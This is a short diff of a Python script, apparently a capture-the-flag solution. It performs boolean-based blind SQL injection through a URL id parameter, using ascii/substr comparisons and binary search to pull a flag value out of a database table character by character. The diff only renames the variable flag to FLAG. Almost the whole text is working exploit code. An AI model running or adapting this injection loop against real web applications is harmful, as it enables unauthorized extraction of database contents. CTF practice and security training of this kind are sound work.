@@ -10,18 +10,18 @@ def ask(cond):
     r = urllib.request.urlopen(URL + "?id=" + urllib.parse.quote(payload)).read().decode()
     return "查询到了" in r
 
-flag = ""
+FLAG = ""
 for pos in range(1, 60):
     lo, hi = 32, 127
     while lo < hi:
         mid = (lo + hi) // 2
-        if ask("ascii(substr((select flag from %s),%d,1))>%d" % (TABLE, pos, mid)):
+        if ask("ascii(substr((select FLAG from %s),%d,1))>%d" % (TABLE, pos, mid)):
             lo = mid + 1
         else:
             hi = mid
     c = chr(lo)
-    flag += c
-    print(flag)
+    FLAG += c
+    print(FLAG)
     if c == "}":
         break
-print("FLAG:", flag)
+print("FLAG:", FLAG)
